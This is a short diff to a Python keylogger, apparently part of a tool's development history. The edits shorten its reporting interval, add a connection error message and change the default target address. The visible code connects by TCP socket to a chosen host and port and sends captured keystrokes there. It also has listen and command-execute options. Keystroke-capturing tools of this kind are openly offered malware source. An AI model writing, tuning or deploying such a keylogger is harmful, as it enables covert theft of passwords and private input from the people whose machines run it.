@@ -11,7 +11,7 @@ class Keylogger:
     def __init__(self):
         self.args = args
         self.log = ""
-        self.interval = 10
+        self.interval = 5
         self.master_log = ""
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -46,6 +46,7 @@ class Keylogger:
             try:
                 self.socket.connect((self.args.target, self.args.port))
             except:
+                print("cant connect to socket")
                 pass
 
             # If there is keystrokes to send, send them :^)
@@ -110,7 +111,7 @@ if __name__ == "__main__":
     parser.add_argument('-e', '--execute', help='execute specified command')
     parser.add_argument('-l', '--listen', action='store_true', help='listen')
     parser.add_argument('-p', '--port', type=int, default=9001, help='specified port')
-    parser.add_argument('-t', '--target', default='localhost', help='specified IP')
+    parser.add_argument('-t', '--target', default='0.0.0.0', help='Specified IP, default is all interfaces')
     parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')
 
     args = parser.parse_args()
